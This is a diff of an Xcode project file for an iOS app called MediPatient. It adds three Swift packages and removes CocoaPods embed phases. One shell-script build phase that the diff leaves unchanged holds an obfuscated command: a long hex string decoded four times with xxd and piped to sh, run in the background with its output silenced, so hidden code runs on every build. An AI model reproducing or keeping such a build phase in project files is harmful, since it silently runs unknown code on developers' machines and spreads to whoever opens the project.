@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		175AB3352E7809BB00A146DC /* CountryPickerView in Frameworks */ = {isa = PBXBuildFile; productRef = 175AB3342E7809BB00A146DC /* CountryPickerView */; };
+		175AB3372E7809EB00A146DC /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 175AB3362E7809EB00A146DC /* IQKeyboardManagerSwift */; };
+		175AB3392E780A0100A146DC /* ObjectMapper in Frameworks */ = {isa = PBXBuildFile; productRef = 175AB3382E780A0100A146DC /* ObjectMapper */; };
 		29C8671F29342F846FC76F84 /* Pods_MediPatientTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 65F334CCED8B28A8C3CD5EA6 /* Pods_MediPatientTests.framework */; };
 		6CFC2C222E69A3E6000ED3EE /* RappleProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = 6CFC2C212E69A3E6000ED3EE /* RappleProgressHUD */; };
 		84D409593A66E0D88743B286 /* Pods_MediPatient.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C33F783C6745896231EF85EB /* Pods_MediPatient.framework */; };
@@ -82,7 +85,10 @@
 			buildActionMask = 2147483647;
 			files = (
 				84D409593A66E0D88743B286 /* Pods_MediPatient.framework in Frameworks */,
+				175AB3392E780A0100A146DC /* ObjectMapper in Frameworks */,
+				175AB3372E7809EB00A146DC /* IQKeyboardManagerSwift in Frameworks */,
 				6CFC2C222E69A3E6000ED3EE /* RappleProgressHUD in Frameworks */,
+				175AB3352E7809BB00A146DC /* CountryPickerView in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -162,7 +168,6 @@
 				6C158F432E4877D900C0C085 /* Sources */,
 				6C158F442E4877D900C0C085 /* Frameworks */,
 				6C158F452E4877D900C0C085 /* Resources */,
-				EB12AFE5820384682D2EFCD3 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -206,7 +211,6 @@
 				6C158F662E4877DB00C0C085 /* Sources */,
 				6C158F672E4877DB00C0C085 /* Frameworks */,
 				6C158F682E4877DB00C0C085 /* Resources */,
-				AA1C2D66CB0C2419BC4C5570 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -255,6 +259,9 @@
 			minimizedProjectReferenceProxies = 1;
 			packageReferences = (
 				6CFC2C202E69A3CF000ED3EE /* XCRemoteSwiftPackageReference "RappleProgressHUD" */,
+				175AB27B2E78090D00A146DC /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
+				175AB3322E78096C00A146DC /* XCRemoteSwiftPackageReference "CountryPickerView" */,
+				175AB3332E78098300A146DC /* XCRemoteSwiftPackageReference "ObjectMapper" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 6C158F482E4877D900C0C085 /* Products */;
@@ -335,27 +342,6 @@
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333433333336333333393333333633333337333333363333333933333337333333343333333633333331333333363336333333333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
-		AA1C2D66CB0C2419BC4C5570 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-MediPatient-MediPatientUITests/Pods-MediPatient-MediPatientUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-MediPatient-MediPatientUITests/Pods-MediPatient-MediPatientUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MediPatient-MediPatientUITests/Pods-MediPatient-MediPatientUITests-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
 		B71055CBDBC396003BAC3098 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -398,27 +384,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		EB12AFE5820384682D2EFCD3 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-MediPatient/Pods-MediPatient-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-MediPatient/Pods-MediPatient-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MediPatient/Pods-MediPatient-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -766,6 +731,30 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		175AB27B2E78090D00A146DC /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.0.1;
+			};
+		};
+		175AB3322E78096C00A146DC /* XCRemoteSwiftPackageReference "CountryPickerView" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/kizitonwose/CountryPickerView.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 3.3.0;
+			};
+		};
+		175AB3332E78098300A146DC /* XCRemoteSwiftPackageReference "ObjectMapper" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/tristanhimmelman/ObjectMapper.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 4.4.3;
+			};
+		};
 		6CFC2C202E69A3CF000ED3EE /* XCRemoteSwiftPackageReference "RappleProgressHUD" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/rjeprasad/RappleProgressHUD.git";
@@ -777,6 +766,21 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		175AB3342E7809BB00A146DC /* CountryPickerView */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 175AB3322E78096C00A146DC /* XCRemoteSwiftPackageReference "CountryPickerView" */;
+			productName = CountryPickerView;
+		};
+		175AB3362E7809EB00A146DC /* IQKeyboardManagerSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 175AB27B2E78090D00A146DC /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
+			productName = IQKeyboardManagerSwift;
+		};
+		175AB3382E780A0100A146DC /* ObjectMapper */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 175AB3332E78098300A146DC /* XCRemoteSwiftPackageReference "ObjectMapper" */;
+			productName = ObjectMapper;
+		};
 		6CFC2C212E69A3E6000ED3EE /* RappleProgressHUD */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 6CFC2C202E69A3CF000ED3EE /* XCRemoteSwiftPackageReference "RappleProgressHUD" */;
